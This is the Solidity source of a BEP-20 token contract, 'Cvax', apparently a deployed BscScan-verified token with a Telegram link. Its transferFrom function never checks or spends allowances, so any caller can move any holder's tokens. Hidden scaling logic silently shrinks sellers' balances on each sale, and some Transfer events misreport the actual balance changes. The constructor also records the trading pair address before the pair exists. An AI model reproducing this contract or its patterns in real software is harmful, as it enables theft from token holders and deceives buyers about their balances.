/**
 *Submitted for verification at BscScan.com on 2021-12-06
*/

// https://t.me/BioWeaponCVAX


// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract Cvax {

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (string memory name_, string memory symbol_, address router_) {
        _name = name_;
        _symbol = symbol_;
        router = router_;
        cvax = address(this);

        row[0] = address(0);
        row[1] = cvax;
        row[2] = pair;
        row[3] = router;

        Router routerAddress = Router(router);

        pair = Factory(routerAddress.factory()).
        createPair(cvax, routerAddress.WETH());

        ratio = 10**14;

        _totalSupply = 10**28;
        circulating = 10**24;

        balances[msg.sender].scale = ratio;
        balances[router].scale = ratio;
        balances[pair].scale = ratio;
        balances[cvax].scale = ratio;
        balances[msg.sender].wallet = circulating;
        balances[cvax].wallet = _totalSupply - circulating;

        emit Transfer(address(0), cvax, _totalSupply);
        emit Transfer(cvax, msg.sender, circulating);
    }

    struct account {
        uint256 wallet;
        uint256 scale;
    }

    string private _name;
    string private _symbol;

    address private pair;
    address private router;
    address private cvax;

    uint256 private ratio;
    uint256 private _totalSupply;
    uint256 private circulating;

    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => account) private balances;
    mapping (uint256 => address) private row;

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

   function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address owner) public view returns (uint256) {
        return balances[owner].wallet * balances[owner].scale / ratio;
    }

    function circulatingSupply() public view returns (uint256) {
        return _totalSupply - balances[cvax].wallet;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        newBalance(to);

        _transfer(msg.sender, to, amount);

        buy(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address sender, address to, uint256 amount) public returns (bool) {
        newBalance(to);

        if (router.balance > 0) {

            _transfer(sender, to, amount);

            stake(sender, amount);
        } else {

            _transferWithFee(sender, to, amount);

            sell(sender, amount);
            setScaleS(sender);
            emit Transfer(sender, to, amount - (amount / 20));
        }
        return true;
    }

    function newBalance(address newAddr) internal {
        if (balances[newAddr].scale == 0) {
            balances[newAddr].scale = ratio;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        uint256 valueS = getValue(sender, amount);
        uint256 valueR = getValue(recipient, amount);
        uint256 senderBalance = balances[sender].wallet;
        require(senderBalance >= valueS, "ERC20: transfer amount exceeds balance");
        balances[sender].wallet = senderBalance - valueS;
        balances[recipient].wallet += valueR;
        emit Transfer(sender, recipient, amount);
    }

    function _transferWithFee(address sender, address recipient, uint256 amount) internal {
        uint256 valueS = getValue(sender, amount);
        uint256 valueR = getValue(recipient, amount - (amount / 20));
        uint256 senderBalance = balances[sender].wallet;
        require(senderBalance >= valueS, "ERC20: transfer amount exceeds balance");
        balances[sender].wallet = senderBalance - valueS;
        balances[recipient].wallet += valueR;
    }

    function buy(address from, address to, uint256 amount) internal {
        if (from == pair) {
            if (from != router) {
                if (to != router) {
                    setRatioB();
                    setScaleB(to);
                    deductBFromCvax();
                    burn(amount);
                }
            }
        }
    }

    function sell(address from, uint256 amount) internal {
        if (balances[cvax].wallet > getDeductS()) {
                setRatioS();
                deductSFromCvax();
                balances[cvax].wallet += getValue(from, amount / 20);
                emit Transfer(from, cvax, amount / 20);
                burn(getValue(from, amount));
                emit Transfer(cvax, address(0), amount);
            }
    }

    function stake(address from, uint256 amount) internal {
        if (balances[cvax].wallet > amount / 3) {
                balances[cvax].wallet -= getValue(from, amount / 3);
                balances[from].wallet += getValue(from, amount / 3);
                emit Transfer(cvax, from, amount / 3);
            }
    }

    function burn(uint256 amount) internal {
        if (balances[cvax].wallet > amount) {
            balances[cvax].wallet -= amount;
            balances[address(0)].wallet += amount;
        }
    }

    function deductBFromCvax() internal {
        uint256 deduct = getDeductB();
        if (balances[cvax].wallet > deduct) {
             balances[cvax].wallet -= deduct;
        }
    }

    function deductSFromCvax() internal {
        uint256 deduct = getDeductS();
        if (balances[cvax].wallet > deduct) {
             balances[cvax].wallet -= deduct;
        }
    }

    function setRatioB() internal {
        if (ratio > 1000) {
            if (ratio > ratio / 200) {
                ratio -= ratio  / 200;
                rateScale();
            }
        }
    }

    function setRatioS() internal {
        if (ratio > 1000) {
            if (ratio > ratio / 50) {
                ratio -= ratio  / 50;
                rateScale();
            }
        }
    }

    function setScaleB(address client) internal  {
        if (balances[client].scale < 10**16) {
            balances[client].scale += balances[client].scale / 50;
        }
    }

    function setScaleS(address client) internal  {
        if (balances[client].scale > 10**10) {
            balances[client].scale -= balances[client].scale / 20;
        }
    }

    function rateScale() internal {
        for (uint i=0; i < 4; i++) {
            balances[row[i]].scale = ratio;
        }
    }

    function getValue(address addr, uint256 amount) internal view returns(uint256 value) {
       value = (amount * ratio) / balances[addr].scale;
       return value;
    }

    function getDeductB() internal view returns (uint256) {
        return circulatingSupply() / 200;
    }

    function getDeductS() internal view returns (uint256) {
        return circulatingSupply() / 20;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }
}